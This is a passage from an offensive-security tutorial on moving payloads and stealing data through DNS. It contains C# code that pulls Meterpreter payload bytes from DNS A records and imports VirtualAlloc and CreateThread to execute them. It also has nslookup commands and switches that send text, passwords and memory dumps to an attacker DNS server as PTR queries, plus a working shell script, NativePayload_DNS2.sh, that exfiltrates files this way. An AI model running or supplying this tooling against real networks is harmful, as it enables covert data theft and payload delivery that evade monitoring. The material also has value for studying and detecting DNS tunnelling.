nslookup.Start();\n\r\n\r \n\r\n\r       \n\r\n\r            string computerList = nslookup.StandardOutput.ReadToEnd();\n\r\n\r           \n\r\n\r            string[] lines = computerList.Split(\'\\r\', \'n\');\n\r\n\r            int ID = 0;\n\r\n\r            foreach (var item in lines)\n\r\n\r            {\n\r\n\r                if (item.Contains(DNS_PTR_A))\n\r\n\r                {\n\r\n\r                    break;\n\r\n\r                }\n\r\n\r                ID++;\n\r\n\r            }\n\r\n\r            List&lt;string&gt; A_Records = new List&lt;string&gt;();\n\r\n\r            try\n\r\n\r            {\n\r\n\r \n\r\n\r                int FindID_FirstAddress = ID + 1;\n\r\n\r                string last_line = lines[lines.Length - 3];\n\r\n\r              \n\r\n\r                A_Records.Add(lines[FindID_FirstAddress].Split(\':\')[1].Substring(2));\n\r\n\r                for (int iq = FindID_FirstAddress + 1; iq &lt; lines.Length - 2; iq++)\n\r\n\r                {\n\r\n\r                    A_Records.Add(lines[iq].Substring(4));                   \n\r\n\r                }\n\r\n\r            }\n\r\n\r            catch (Exception e1)\n\r\n\r            {\n\r\n\r                Console.WriteLine(\"error 1: {0}\", e1.Message);\n\r\n\r            }\n\r\n\r            /// Debug\n\r\n\r            Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r            Console.WriteLine();\n\r\n\r            Console.ForegroundColor = ConsoleColor.DarkGreen;\n\r\n\r            Console.WriteLine(\"[!] Debug Mode [ON]\");\n\r\n\r            Console.ForegroundColor = ConsoleColor.DarkGreen;\n\r\n\r            Console.WriteLine(\"[!] DNS Server Address: {0}\", DnsServer);\n\r\n\r            Console.ForegroundColor = ConsoleColor.Green;\n\r\n\r            Console.WriteLine(\"[&gt;] Downloading Meterpreter Payloads or Text Data by ({1}) DNS A Records for Domain Name : {0}\", DNS_PTR_A, A_Records.Count.ToString());\n\r\n\r            Console.WriteLine();\n\r\n\r            Console.ForegroundColor = ConsoleColor.DarkYellow;\n\r\n\r            foreach (var item3 in A_Records)\n\r\n\r            {\n\r\n\r                Console.Write(\"[{0}] , \",item3.ToString());               \n\r\n\r            }\n\r\n\r            Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r            Console.WriteLine();\n\r\n\r \n\r\n\r            int serial = 0;\n\r\n\r            string[] obj = new string[4];\n\r\n\r \n\r\n\r            /// X.X.X * Y = Payload length; so A_Records * 3 is your Payload Length ;)\n\r\n\r            byte[] XxXPayload = new byte[A_Records.Count * 3];\n\r\n\r \n\r\n\r            Int32 Xnumber = 0;\n\r\n\r \n\r\n\r            for (int Onaggi = 1; Onaggi &lt;= A_Records.Count; Onaggi++)\n\r\n\r            {\n\r\n\r \n\r\n\r                foreach (var item in A_Records)\n\r\n\r                {\n\r\n\r                    obj = item.Split(\'.\');\n\r\n\r                    serial = Convert.ToInt32(item.Split(\'.\')[3]);\n\r\n\r                    if (serial == Onaggi)\n\r\n\r                    {\n\r\n\r                        XxXPayload[Xnumber] = Convert.ToByte(obj[0]);\n\r\n\r                        XxXPayload[Xnumber + 1] = Convert.ToByte(obj[1]);\n\r\n\r                        XxXPayload[Xnumber + 2] = Convert.ToByte(obj[2]);\n\r\n\r \n\r\n\r                        Xnumber++;\n\r\n\r                        Xnumber++;\n\r\n\r                        Xnumber++;\n\r\n\r \n\r\n\r                        break;\n\r\n\r                    }\n\r\n\r                }\n\r\n\r            }\n\r\n\r           \n\r\n\r            return XxXPayload;\n\r\n\r \n\r\n\r        }\n\r\n\r        private static UInt32 MEM_COMMIT = 0x1000;\n\r\n\r        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;\n\r\n\r \n\r\n\r        [DllImport(\"kernel32\")]\n\r\n\r        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);\n\r\n\r        [DllImport(\"kernel32\")]\n\r\n\r        private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);\n\r\n\r        [DllImport(\"kernel32\")]\n\r\n\r        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);\n\r\n\r    }\n\r\n\r}\n\r\n\r ","","topics\\Chapter 4.html","\n\r\n\r \n\r\n\rChapter 5 : Exfiltration and Uploading DATA by DNS Traffic (PTR Records)\n\r\n\r\n\r•Goal : Understanding this technique by C# \n\r\n\r\n\r•Demo : C# Code “NativePayload_DNS2” Step by step. \n\r\n\r\n\r \n\r\n\r \n\r\n\rPART1 , Understanding this technique by C# \n\r\n\rIn this chapter I want to explain how can Send DATA to Attacker Server by DNS PTR records so this is one way for DATA Exfiltration.\n\r\n\rThis technique is Reversing “A record” Technique as I mentioned in previous Article and “Chapter 4” so for understanding this technique you should read previous Article “Chapter 4” to but in this article I will explain this Technique very simple .\n\r\n\rAgain Why DNS protocol?\n\r\n\rBecause DNS traffic in the most networks are available without monitoring or Filtering by IPS/IDS or hardware firewalls .In this article I want to show you one way for Exfiltration DATA by DNS Request in this case by “PTR Records” over Network.\n\r\n\rHow you can do this ?\n\r\n\rfirst you need imagine this Payload or Text DATA for example “this is test” .\n\r\n\rAs I explained in previous “Chapter 4” we can convert this Text to Bytes then by converting these bytes to “Decimal” we can have IPv4 Addresses. \n\r\n\rSo if you want to Download Data by this technique you should use A records Request/Response for Downloading DATA from DNS Server in this case Attacker DNS Server and if you want to Uploading DATA by this Technique “Exfiltration” then you should use DNS PTR Records Request for sending DATA to DNS Server as Request Packet and in attacker side you can Dump these Request DATA by DNS Log file and Analyzing PTR Records in DNS log file (convert them “IPv4” from Decimal to Bytes for Read DATA behind DNS PTR Records).\n\r\n\rIn previous Chapter we talked about A Records now in this Chapter or Article I want to Talk about PTR Records and Exfiltration Technique by this idea : (Reversing A Record Technique).\n\r\n\rFor example you want to send this text to attacker DNS Server : \"this is test\"\n\r\n\r\"DATA\" == converting to IPv4 Address ==&gt; {bytes / Decimal type}.Z\n\r\n\r\"wxy\" == converting to IPv4 Address ==&gt; {w.x.y}.Z\n\r\n\r \n\r\n\r\"thi\" == converting to IPv4 Address ==&gt; 116.104.105.1\n\r\n\r \n\r\n\r\"s i\" == converting to IPv4 Address ==&gt; 115.32.105.2\n\r\n\r \n\r\n\r\"s t\" == converting to IPv4 Address ==&gt; 115.32.116.3\n\r\n\r \n\r\n\r\"est\" == converting to IPv4 Address ==&gt; 101.115.116.4\n\r\n\r \n\r\n\rso your DNS PTR Records Request will send by these commands to Attacker DNS Server with IPAddress “192.168.56.1” :\n\r\n\r \n\r\n\rnslookup 116.104.105.1  192.168.56.1\n\r\n\r \n\r\n\rnslookup 115.32.105.2  192.168.56.1\n\r\n\r \n\r\n\rnslookup 115.32.116.3  192.168.56.1\n\r\n\r \n\r\n\rnslookup 101.115.116.4  192.168.56.1\n\r\n\r \n\r\n\rFinally an attacker can read these DATA by Dumping DNS Server log files.(convert them “IPv4” from Decimal to Bytes for Read DATA behind DNS PTR Records).\n\r\n\rIn this example we had 3 octets “W.X.Y” of IPv4 Address for PAYLOADS :\n\r\n\r \n\r\n\r\"wxy\".z == converting to IPv4 Address ==&gt; {w.x.y}.Z1\n\r\n\r\"wxy\".z == converting to IPv4 Address ==&gt; {w.x.y}.Z2\n\r\n\r\"wxy\".z == converting to IPv4 Address ==&gt; {w.x.y}.Z3\n\r\n\r\"wxy\".z == converting to IPv4 Address ==&gt; {w.x.y}.Z4\n\r\n\r \n\r\n\r\"thi\" == converting to IPv4 Address ==&gt; 116.104.105.1\n\r\n\r\"s i\" == converting to IPv4 Address ==&gt; 115.32.105.2\n\r\n\r\"s t\" == converting to IPv4 Address ==&gt; 115.32.116.3\n\r\n\r\"est\" == converting to IPv4 Address ==&gt; 101.115.116.4\n\r\n\r \n\r\n\rnow we have this pattern for Uploading DATA by IPv4 Addresses but we can have something like this for changing this pattern :\n\r\n\r \n\r\n\r\"wxy\".z == converting to IPv4 Address ==&gt; {w.x.y}.Z1\n\r\n\r\"yxz\".w == converting to IPv4 Address ==&gt; W2.{x.y.z}\n\r\n\r\"wyz\".x == converting to IPv4 Address ==&gt; {w}.X3.{y.z}\n\r\n\r\"wxz\".y == converting to IPv4 Address ==&gt; {w.x}.Y4.{z}\n\r\n\r \n\r\n\r\"thi\" == converting to IPv4 Address ==&gt; 116.104.105.1\n\r\n\r\"s i\" == converting to IPv4 Address ==&gt; 2.115.32.105\n\r\n\r\"s t\" == converting to IPv4 Address ==&gt; 115.3.32.116\n\r\n\r\"est\" == converting to IPv4 Address ==&gt; 101.115.4.116\n\r\n\r \n\r\n\ralso we can use all 4 octets for IPv4 Address so we have something like this :\n\r\n\r \n\r\n\r\"wxyz\" == converting to IPv4 Address ==&gt; {w.x.y.z}\n\r\n\r\"wxyz\" == converting to IPv4 Address ==&gt; {w.x.y.z}\n\r\n\r\"wxyz\" == converting to IPv4 Address ==&gt; {w.x.y.z}\n\r\n\r\"wxyz\" == converting to IPv4 Address ==&gt; {w.x.y.z}\n\r\n\r \n\r\n\r\"this\" == converting to IPv4 Address ==&gt; 116.104.105.115\n\r\n\r\" is \" == converting to IPv4 Address ==&gt;  32.105.115.32\n\r\n\r\"test\" == converting to IPv4 Address ==&gt; 116.101.115.116\n\r\n\r \n\r\n\rIn “Picture 1” you will see how we can read these technique by “4 octets” with Log-Reader Tool.\n\r\n\rin this Example we have this text “06C72790” in our DNSlog.txt File and this text Created by these IPv4 Addresses:\n\r\n\r48.54.67.55 and 50.55.57.48 so we had something like this in Client for sending these data to DNS Server by Nslookup command :\n\r\n\rNslookup   “DATA converted to IPv4 Address” “attacker_Dns_Server_address”\n\r\n\r \n\r\n\rNslookup  48.54.67.55  192.168.56.1\n\r\n\rNslookup  50.55.57.48  192.168.56.1\n\r\n\r \n\r\n\rit means :   48 54 67 55  ==&gt; 0 6 C 7 \n\r\n\rit means :   50 55 57 48  ==&gt; 2 7 9 0 \n\r\n\r \n\r\n\rso in Dndmasq log file we have these DNS PTR Requests (reverse records) :\n\r\n\r \n\r\n\r55.67.54.48.in-addr.arpa   === &gt; 06C7\n\r\n\r48.57.55.50.in-addr.arpa   === &gt; 2790\n\r\n\rby this C# Code “Log-Reader tool” you can see in “Picture 1” I read these DATA by this code from Log file.\n\r\n\r \n\r\n\r byte[] debug = new byte[4];\n\r\n\r                foreach (string item in TextFile)\n\r\n\r                {\n\r\n\r                    if (item.Contains(\".\") &amp;&amp; item.ToUpper().Contains(\"IN-ADDR.ARPA\"))\n\r\n\r                    {\n\r\n\r                        if (!item.Contains(DNS_Address_Reverse_Sort))\n\r\n\r                        {\n\r\n\r \n\r\n\r                            if (Is_4_Octets_Mode)\n\r\n\r                            {\n\r\n\r                                string[] tmp = item.Split(\'.\');\n\r\n\r \n\r\n\r                                Records.Add(Convert.ToByte(tmp[3]));\n\r\n\r                                Records.Add(Convert.ToByte(tmp[2]));\n\r\n\r                                Records.Add(Convert.ToByte(tmp[1]));\n\r\n\r                                Records.Add(Convert.ToByte(tmp[0]));\n\r\n\r                              \n\r\n\r                                debug[0] = Convert.ToByte(tmp[3]);\n\r\n\r                                debug[1] = Convert.ToByte(tmp[2]);\n\r\n\r                                debug[2] = Convert.ToByte(tmp[1]);\n\r\n\r                                debug[3] = Convert.ToByte(tmp[0]);\n\r\n\r \n\r\n\r                            }\n\r\n\r                            if (!Is_4_Octets_Mode)\n\r\n\r                            {\n\r\n\r                                string[] tmp = item.Split(\'.\');\n\r\n\r\n\r\n\r                                Records.Add(Convert.ToByte(tmp[3]));\n\r\n\r                                Records.Add(Convert.ToByte(tmp[2]));\n\r\n\r                                Records.Add(Convert.ToByte(tmp[1]));\n\r\n\r \n\r\n\r                                debug[0] = Convert.ToByte(tmp[3]);\n\r\n\r                                debug[1] = Convert.ToByte(tmp[2]);\n\r\n\r                                debug[2] = Convert.ToByte(tmp[1]);\n\r\n\r                             }\n\r\n\r \n\r\n\r \n\r\n\rin “Picture 1” you can see how we can read DATA from Dnsmasq log file in this case our Text is “06C7” and “2790”\n\r\n\r  \n\r\n\rPicture 1:\n\r\n\r \n\r\n\rnow in next “Picture 2” you will see where exactly was these two Records :\n\r\n\ras you can see in this “Picture 2” we have this Text “06C72790” in first line .\n\r\n\r  \n\r\n\rPicture 2:\n\r\n\r \n\r\n\r“06C72790  0E 00 00   00 00 00 00   00 00 00 00   00 42 4D 5E      .e...........BM^”\n\r\n\r \n\r\n\rnow you can understand we talked about where of our Exfiltration DATA by DNS PTR records in these two pictures .\n\r\n\rAs you can see in these pictures we have this Memory-Dump DATA behind these DNS PTR Records in “Dnslog2.txt” File and this Log File Created by Dnsmasq tool.\n\r\n\r \n\r\n\rNote : I will explain how you can use this Tool for this technique but first we should talk about Technique and C# Codes.\n\r\n\rSo in “Picture 1 and 2” you can see how an attacker can read exfiltration DATA behind these Logs in this case Memory-Dumped DATA was behind DNS PTR Requests.\n\r\n\rNote: Remember in this case for uploading DATA by PTR Records we only need to send these Requests to DNS Server by Nslookup and Response From DNS Server to Client is not important in this Method for Sending or Uploading DATA as you can see in next “Picture 4” my 2 first Requests had not this Error “Query refused” so it means I had 2 A records in my Fake DNS Server for Response to these PTR Requests.  \n\r\n\rPicture 3:\n\r\n\rin “Picture 3” you can see I want to Send These DATA to FakeDNS Server by PTR Requests :\n\r\n\r“this is Password: @sWPqo%4!123”\n\r\n\rso my PTR Records will be something like these because I used “3 octets Mode” with using Switches “exf“ + “3” for Sending DATA:\n\r\n\r“thi” ==== converting to IPv4 Address ==&gt; 116.104.105.1\n\r\n\r\"s i\" ==== converting to IPv4 Address ==&gt; 115.32.105.2\n\r\n\rin “Picture 4” you can see I had “test.com” A record for these two IPAddress “ 116.104.105.1 and 115.32.105.2”Picture 4: \n\r\n\rso it doesn\'t matter you have Error or not because you only want to send these DATA to DNS server then Read them by DNS Logs only .\n\r\n\rFinally by “LogReader.exe” tool you can Read DNS Log file to dump this Password Behind Log file.\n\r\n\rin “Picture 5” you can see this password .\n\r\n\r \n\r\n\rPicture 5: \n\r\n\rIt my recommended to read my previous “Chapter 4” about A Record Technique for understanding this Technique and PTR technique too but in this article I will not talk more than this about C# Code because I explained them in previous chapter4 but in this article I just want to talk about this Section of my Code was New for Working with PTR Records in “NativePayload_DNS2.exe”, Version 2.\n\r\n\rif (args[0].ToUpper() == \"EXF\")\n\r\n\r            {\n\r\n\r                if (args.Length &gt; 2)\n\r\n\r                {\n\r\n\r                    if (args[1] == \"4\")\n\r\n\r                    {\n\r\n\r                        /// exfiltration by Text/String \n\r\n\r                        /// octets Mode 4\n\r\n\r                        Is_4_OctetsMode = true;\n\r\n\r                        __nslookup(args[3], args[4], true, Convert.ToInt32(args[2].Split(\'.\')[0] + \"000\"), Convert.ToInt32(args[2].Split(\'.\')[1] + \"000\"));\n\r\n\r                    }\n\r\n\r                    if (args[1] == \"3\")\n\r\n\r                    {\n\r\n\r                        /// exfiltration by Text/String \n\r\n\r                        /// octets Mode 3\n\r\n\r                        Is_4_OctetsMode = false;\n\r\n\r                        __nslookup(args[3], args[4], true, Convert.ToInt32(args[2].Split(\'.\')[0] + \"000\"), Convert.ToInt32(args[2].Split(\'.\')[1] + \"000\"));\n\r\n\r                    }\n\r\n\r                }\n\r\n\r \n\r\n\r            }\n\r\n\r            if (args[0].ToUpper() == \"EXFILE\")\n\r\n\r            {\n\r\n\r                if (args.Length &gt; 2)\n\r\n\r                {\n\r\n\r \n\r\n\r                    if (args[1] == \"4\")\n\r\n\r                    {\n\r\n\r                        /// exfiltration by Text File                 \n\r\n\r                        /// octets Mode 4\n\r\n\r                        Is_4_OctetsMode = true;\n\r\n\r                        string TextFile = System.IO.File.ReadAllText(args[3]);\n\r\n\r                        __nslookup(TextFile, args[4], true, Convert.ToInt32(args[2].Split(\'.\')[0] + \"000\"), Convert.ToInt32(args[2].Split(\'.\')[1] + \"000\"));\n\r\n\r                    }\n\r\n\r                    if (args[1] == \"3\")\n\r\n\r                    {\n\r\n\r                        /// exfiltration by Text File\n\r\n\r                        /// octets Mode 3                 \n\r\n\r                        Is_4_OctetsMode = false;\n\r\n\r                        string TextFile = System.IO.File.ReadAllText(args[3]);\n\r\n\r                        __nslookup(TextFile, args[4], true, Convert.ToInt32(args[2].Split(\'.\')[0] + \"000\"), Convert.ToInt32(args[2].Split(\'.\')[1] + \"000\"));\n\r\n\r                    }\n\r\n\r                }\n\r\n\r \n\r\n\r            }\n\r\n\r\n\r\n\rso by these code we have new Switch “Exf” and “Exfile” for Exfiltrating/Uploading DATA by PTR Request via Nslookup command and we have these New Syntax  :\n\r\n\r \n\r\n\rSyntax 1 : NativePayload_DNS2.exe “Exf” “Octets Mode 3 or 4”  “Min.Max Delay”  “Exfiltration Text” “FakeDNSServer”\n\r\n\rNativePayload_DNS2.exe Exf 4 1.6 \"any text you want” 192.168.56.1 \n\r\n\rin this example this tool will send your Text to FakeDNSserver 192.168.56.1 with 4 octets IPv4 with Delay between min “1 Seconds” and Max “6 Seconds”.\n\r\n\rSyntax 2 : NativePayload_DNS2.exe “Exfile” “Octets Mode 3 or 4”  “Min.Max Delay”  “TextFile.txt” “FakeDNSServer”\n\r\n\rNativePayload_DNS2.exe Exfile 4 1.12 \"test.txt\" 192.168.56.1\n\r\n\rin this example this tool will send your Text in your Test.txt File to FakeDNSserver 192.168.56.1 with 4 octets IPv4 with Delay between min “1 Seconds” and Max “12 Seconds”.\n\r\n\rSo we have these Syntaxes in Version 2.0 and you can see all of them by using Switch “Help” : \n\r\n\rPicture 6: \n\r\n\r \n\r\n\rUsing this feature step by step : \n\r\n\rnow I want to explain how can use this tool for Exfiltration and Uploading DATA via DNS PTR Requests Step by step :\n\r\n\rin this example I want to send this file MemDump.txt via DNS PTR Request to attacker DNS Server so in “Picture 7” you can see I used this syntax for sending this file via DNS PTR Request very simple .\n\r\n\rStep 1 : Sending DATA by switch “Exf” or “Exfile” by NativePayload_DNS2.exe tool \n\r\n\rPicture 7:\n\r\n\rin this case I used Switch “Exfile”  with “3” it means I want to send these DATA by 3 octets Mode with Delay between “minimum 1 seconds” and “Max 6 seconds” and as you can see for sending this file via DNS PTR Records by 3 octets we need 164 Requests.\n\r\n\rStep 2 : Adapting Dnsmasq log file for reading by “awk” command \n\r\n\rIn next “Picture 8” you can see we have Dnsmasq log file “mylogx6.txt” and for adapting this file for reading by Log-Reader tool you should use this Linux command “awk” like “Picture 8” and in this Command “$6” is your PTR Records column in your dnsmasq log file.\n\r\n\rAwk \'{print $6}\' /root/myDnsmasqlog.txt &gt; Dnslog.txtPicture 8: \n\r\n\rStep 3 : Reading DNS Log file by LogReader.exe tool\n\r\n\rnow this Dnslog.txt file is ready for Reading by my C# Code “LogReader.exe” tool and you can Read this log file by these syntax:\n\r\n\rSyntax 1: LogReader.exe “Dnsmasq_log.txt” “Octet Mode 3 or 4” “DNSServer_IPAddress”\n\r\n\rSyntax 2: LogReader.exe “Dnsmasq_log.txt” “Octet Mode 3 or 4” “DNSServer_IPAddress” Debug\n\r\n\ras you can see in “Picture 9” with “Logreader.exe” tool you can see what we have behind this Log file.Picture 9: \n\r\n\rand with switch “Debug” you can see more detail about each line of Log file like “Picture 10”\n\r\n\rso in this case our syntax is :\n\r\n\rSyntax 2: LogReader.exe “Dnslog.txt” 3  192.168.56.1  Debug \n\r\n\rPicture 10:\n\r\n\rin next “Picture 11” you can see I made this File by “4 octets” via DNS PTR Request :Picture 11: \n\r\n\ras you can see in “Picture 11” we need 123 PTR Requests by switch “exfile” +  “4”.\n\r\n\rin Next “Picture 12” you can see we should make New Text file by “awk” command. Now this “Dnslog2.txt” is ready to reading by C# Code “LogReader.exe” \n\r\n\rPicture 12:\n\r\n\rfinally by this command you can see what is behind this Dnslog2.txt file made by Dnsmasq tool like “Picture 13” \n\r\n\rPicture 13:\n\r\n\rerror with wrong switch\n\r\n\rRemember if you used wrong Switch for Reading DNS Log file like Picture 14 you will have something like this “Picture 14” so you should know what Mode used for Exfiltration “3 Octets or 4 Octets” then for Reading Log files you need use that.\n\r\n\r \n\r\n\rin this example I used “3 octets” for making Log file and exfiltarion so if you want to use Switch “4” then you will have something like this :Picture 14: error with choosing wrong switch \n\r\n\ras you can see in “Picture 14” with switch “3” I have Correct Result but with switch “4” I have error .\n\r\n\rLogReader.exe tool with “Debug Mode”\n\r\n\rI next “Picture 15” you can see Debug Mode for Reading DNS Log files so if you used Switch “3” with NativePayload_DNS2 tool for Exfiltration then you will have something like “Picture 10” and if you used Switch “4” then you will have something like “Picture 15”\n\r\n\r  \n\r\n\rPicture 15:\n\r\n\ras you can see in “Picture 15” for each PTR address we have 4 bytes of DATA but in Picture 10 for each PTR Address we had 3 bytes of DATA.\n\r\n\r \n\r\n\rUsing this method on Linux systems only\n\r\n\rin this part I want to Use this method on Linux systems only via simple Script so I will show you how can do this on linux systems via simple Script “NativePayload_DNS2.sh” : \n\r\n\rI talked about this tool “NativePayload_DNS2.sh” for using DNS A Records in previous “Chapter 4” now in this “Chapter 5” we will talk about DNS PTR Records so we should talk about (Example A-Step1 and A-Step2).\n\r\n\r \n\r\n\r \n\r\n\r \n\r\n\r\n\r\n\rUsing tool step by step : \n\r\n\rStep1 (Server Side) : in this step you should make one DNS server by dnsmasq tool so for doing this only you need to use this \n\r\n\rsyntax : NativePayload_DNS2.sh -r \n\r\n\rNote : (server side) your linux Network-Adapter settings for DNS should be “OFF” ,  it means : setting “DNS Automatic = Off”\n\r\n\rwith this simple Script and this syntax “NativePayload_DNS2.sh -r“  my code will start DNSMASQ tool with log file “/var/log/dnsmasq.log” then this code will check this log file every 10 sec to detect any change for PTR Records via dnsmasq.log file finally will dump Exfil DATA behind each DNS PTR Query very simple.\n\r\n\rin these Pictures you can see Steps for this method via NativePayload_DNS2.sh tool :Picture A: \n\r\n\ras you can see in this “Picture A”: I used two Linux systems with IPv4 Address: 128 and 131 and this Linux host with IPv4 128 is my Server side system so on this server my DNS automatic settings is “off” and I used server side syntax : NativePayload_dns2.sh -r\n\r\n\rand on Client side I used this syntax :\n\r\n\rNativePayload_dns2.sh -u  test.txt  192.168.136.128  1\n\r\n\rwith this syntax (Client Side) I want to send test.txt from client IPv4:131 to server IPv4:128 by delay(1 sec) via DNS PTR queries.\n\r\n\r   Picture B: \n\r\n\ras you can see in “Picture B” on server side we have Text for test.txt file by Dumped Logs for DNS PTR Queries very simple.\n\r\n\rAt a glance : \n\r\n\rIn this case you should rethink about this : maybe DNS Requests are more than simple Request also your DNS Log files too so by this Technique your Networks are vulnerable if an attacker want to use this PTR Technique and remember this important point in this case our Payloads Injected to IPv4 Addresses it means our payload and Exfiltration DATA was in DNS Packet as IPv4 Addresses and DNS PTR Requests.\n\r\n\r \n\r\n\rNativePayload_DNS2.sh\n\r\n\r #!/bin/sh\n\r\n\recho\n\r\n\recho \"NativePayload_DNS2.sh , Published by Damon Mohammadbagher 2017-2018\" \n\r\n\recho \"Injecting/Downloading/Uploading DATA to DNS Traffic via DNS A and PTR Records\"\n\r\n\recho \"help syntax: ./NativePayload_DNS2.sh help\"\n\r\n\recho\n\r\n\r        if [ $1 == \"help\" ] \n\r\n\r        then\n\r\n\r        tput setaf 2;\n\r\n\r        echo\n\r\n\r        echo \"Example A-Step1: (Server Side ) ./NativePayload_DNS2.sh -r\"\n\r\n\r        echo \"Example A-Step2: (Client Side ) ./NativePayload_DNS2.sh -u text.txt DNSMASQ_IPv4 delay(sec)\"\n\r\n\r        echo \"example IPv4:192.168.56.110 : ./NativePayload_DNS2.sh -r\"\n\r\n\r        echo \"example IPv4:192.168.56.111 : ./NativePayload_DNS2.sh -u text.txt 192.168.56.110 0\"\n\r\n\r        echo \"Description: with A-Step1 you will make DNS Server , with A-Step2 you can Send text file via PTR Queries to DNS server\"\n\r\n\r        echo\n\r\n\r        echo \"Example B-Step1: (Server Side ) ./NativePayload_DNS2.sh -d makedns test.txt mydomain.com\"\n\r\n\r        echo \"Example B-Step2: (Client Side ) ./NativePayload_DNS2.sh -d getdata mydomain.com DNSMASQ_IPv4\"\n\r\n\r        echo \"example IPv4:192.168.56.110 : ./NativePayload_DNS2.sh -d makedns text.txt google.com\"\n\r\n\r        echo \"example IPv4:192.168.56.111 : ./NativePayload_DNS2.sh -d getdata google.com 192.168.56.110\"\n\r\n\r        echo \"Description: with B-Step1 you will have DNS Server , with B-Step2 you can Dump test.txt file from server via A record Query\"\n\r\n\r        echo\n\r\n\r        fi\n\r\n\r \n\r\n\r        # uploading data via PTR queries (Client Side \"A\")\n\r\n\r        if [ $1 == \"-u\" ] \n\r\n\r        then\n\r\n\r                c=0                \n\r\n\r                octets=\"\"\n\r\n\r                tput setaf 9;\n\r\n\r                        for op in `xxd -p -c 1 $2`; do\n\r\n\r                        echo \"[!] injecting this text via IPv4 octet:\" \"`echo $op | xxd -r -p`\" \" ==byte==&gt; \" $op \" ==dec==&gt; \" $((16#$op)).\n\r\n\r                        octets+=$((16#$op)).                        \n\r\n\r                        ((c++))\n\r\n\r                                if(($c == 4))\n\r\n\r                                then\n\r\n\r                                tput setaf 3;\n\r\n\r                                echo \"[!] Your IPv4 is : \" \"${octets::-1}\"\n\r\n\r                                echo\n\r\n\r                                tput setaf 9;\n\r\n\r                                octets=\"\"\n\r\n\r                                c=0                                \n\r\n\r                                else\n\r\n\r                                tput setaf 9;\n\r\n\r                                fi\n\r\n\r                        done\n\r\n\r        echo\n\r\n\r        tput setaf 9;\n\r\n\r        echo \"[!] [Exfil/Uploading DATA] via PTR Record Queries\"\n\r\n\r        tput setaf 2;\n\r\n\r        echo \"[!] Sending DNS Lookup by nslookup command\"\n\r\n\r        tput setaf 2;\n\r\n\r        echo \"[!] Sending DNS Lookup to DNS Server: \" $3\n\r\n\r        echo \"[!] Sending DNS Lookup by Delay (sec): \" $4\n\r\n\r        echo\n\r\n\r        tput setaf 9;\n\r\n\r        tempip=\"\"\n\r\n\r        payload=\"\"\n\r\n\r        i=0\n\r\n\r        Lookupcount=0\n\r\n\r                for ops in `xxd -p -c 1 $2`; do\n\r\n\r                Exfil=$ops\n\r\n\r                temp=`echo $((16#$Exfil)).`\n\r\n\r                tempip+=$temp  \n\r\n\r                payload+=$tempip\n\r\n\r                ipv4=\"\"\n\r\n\r \n\r\n\r                        if(($i == 3))\n\r\n\r                        then\n\r\n\r                        ipv4+=$tempip\n\r\n\r                        tput setaf 9;\n\r\n\r                        echo \"[&gt;] [$Lookupcount] Nslookup IPv4 Address: \"  \"${ipv4::-1}\"\n\r\n\r                        tput setaf 2;\n\r\n\r                        nslookup \"${ipv4::-1}\" $3 | grep arpa\n\r\n\r                        i=0\n\r\n\r                        tempip=\"\"\n\r\n\r                        ((Lookupcount++))\n\r\n\r                        sleep $4\n\r\n\r                        else\n\r\n\r                        ((i++))\n\r\n\r                        fi\n\r\n\r\n\r\n\r                done\n\r\n\r        fi\n\r\n\r \n\r\n\r        # download data via A records queries\n\r\n\r        if [ $1 == \"-d\" ] \n\r\n\r        then\n\r\n\r \n\r\n\r        # Syntax : NativePayload_DNS2.sh -d getdata domain_name DnsMasq_IPv4\" (CLIENT SIDE \"B\")\n\r\n\r        if [ $2 == \"getdata\" ] \n\r\n\r        then        \n\r\n\r        PayloadLookups=`nslookup $3  $4 | grep  Add | sort -t. -k 4 -n`\n\r\n\r        tput setaf 9;        \n\r\n\r        echo \"[!] Downloading Mode , Dump Text DATA via DNS A Records \"        \n\r\n\r        tput setaf 2;        \n\r\n\r        echo \"[!] Sending DNS A Records Queries for Domain :\" $3 \"to DNSMASQ-Server:\" $4\n\r\n\r        echo \"[!] to dump test.txt file via A records you should use this syntax in server side:\"\n\r\n\r        tput setaf 9;\n\r\n\r        echo \"[!] Syntax : NativePayload_DNS2.sh -d makedns test.txt google.com\"\n\r\n\r        echo \"[&gt;] Dumping this Text via DNS A Record Query:\"\n\r\n\r        echo\n\r\n\r        ARecordscounter=0\n\r\n\r                for op in $PayloadLookups; do\n\r\n\r                Lookups=`echo $op | cut -d\':\' -f2`\n\r\n\r                        if [[ $Lookups != *\"#53\"* ]]; \n\r\n\r                        then\n\r\n\r                                if [[ $Lookups != *\" \"* ]]; \n\r\n\r                                then\n\r\n\r                                dec1=`echo $Lookups | cut -d\'.\' -f1`\n\r\n\r                                dec2=`echo $Lookups | cut -d\'.\' -f2`\n\r\n\r                                dec3=`echo $Lookups | cut -d\'.\' -f3`\n\r\n\r                                tput setaf 9;        \n\r\n\r                                printf \'%x\'  `echo $dec1 $dec2 $dec3` | xxd -r -p \n\r\n\r                                fi\n\r\n\r                                ((ARecordscounter++))\n\r\n\r                        fi\n\r\n\r                done\n\r\n\r                echo\n\r\n\r                echo\n\r\n\r                tput setaf 2;        \n\r\n\r                echo \"[!] Dumping Done , Performed by\" $((ARecordscounter/2)) \"DNS A Records for domain :\" $3 \"from Server:\" $4\n\r\n\r                echo\n\r\n\r \n\r\n\r \n\r\n\r        fi\n\r\n\r        # Creating DNS Server and DNSHOST.TXT file (SERVER SIDE \"B\")\n\r\n\r        # NativePayload_DNS2.sh -d makedns google.com\n\r\n\r        if [ $2 == \"makedns\" ] \n\r\n\r        then        \n\r\n\r \n\r\n\r                c=0                \n\r\n\r                octets=\"\"\n\r\n\r                tput setaf 9;\n\r\n\r                echo \" \" &gt; DnsHost.txt\n\r\n\r                SubnetHostIDcounter=0\n\r\n\r                        for op in `xxd -p -c 1 $3`; do\n\r\n\r                        echo \"[!] injecting this text via IPv4 octet:\" \"`echo $op | xxd -r -p`\" \" ==byte==&gt; \" $op \" ==dec==&gt; \" $((16#$op)).\n\r\n\r                        octets+=$((16#$op)).                        \n\r\n\r                        ((c++))\n\r\n\r                                if(($c == 3))\n\r\n\r                                then\n\r\n\r                                tput setaf 3;                                \n\r\n\r                                echo 